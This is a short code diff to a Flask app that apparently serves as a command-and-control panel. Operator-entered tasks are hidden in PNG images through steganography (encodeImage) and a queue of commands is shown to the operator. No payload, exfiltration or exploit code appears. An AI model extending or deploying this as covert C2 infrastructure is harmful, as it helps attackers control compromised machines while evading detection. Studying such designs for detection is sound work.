@@ -190,12 +190,16 @@ def getCommand():
 
             # TODO CHANGE THE 'DONE' STATUS OF THE COMMAND TO TRUE, SINCE WE RECEIVED THE RESPONSE
 
-        task_queue = Command.query.all()
-        # TODO CONVERT THESE COMMANDS TO STEGA PICTURES AND STORE THEM IN A FILE? OR MAKE A LIST
+            task_queue = Command.query.all()
+            image_name = "encImages/" + imageNum + "_diniFall.png"
+            if os.path.exists(image_name):
+                return render_template('commands.html', task_queue=task_queue, image_name=image_name)
+            # TODO CONVERT THESE COMMANDS TO STEGA PICTURES AND STORE THEM IN A FILE? OR MAKE A LIST
 
-        return render_template('commands.html', task_queue=task_queue)
-    else:
-        return render_template('redir.html')
+            return render_template('commands.html', task_queue=task_queue)
+
+    # if something goes wrong
+    return render_template('redir.html')
 
 
 @app.route('/create-task', methods=['POST'])
@@ -203,16 +207,16 @@ def getCommand():
 def create():
     cmd, cmd2, cmd3 = "", "", ""
 
-    if request.form['content'] != None:
-        cmd = request.form['content']
-    # if request.form['content2'] != None:
-    #     cmd2 = request.form['content2']
-    # if request.form['content3'] != None:
-    #     cmd3 = request.form['content3']
+    if request.form['task_1'] != None:
+        cmd = request.form['task_1']
+    if request.form['task_2'] != None:
+        cmd2 = request.form['task_2']
+    if request.form['task_3'] != None:
+        cmd3 = request.form['task_3']
 
     cmds = [cmd, cmd2, cmd3]
     pic_num = random.randint(1, 5)
-    img = "images/diniFall" + str(pic_num) + ".jpg"
+    img = "images/diniFall" + str(pic_num) + ".png"
 
     encodeImage(cmds, img, 1)
     # new_task = Command(cmd=request.form['content'], done=False)
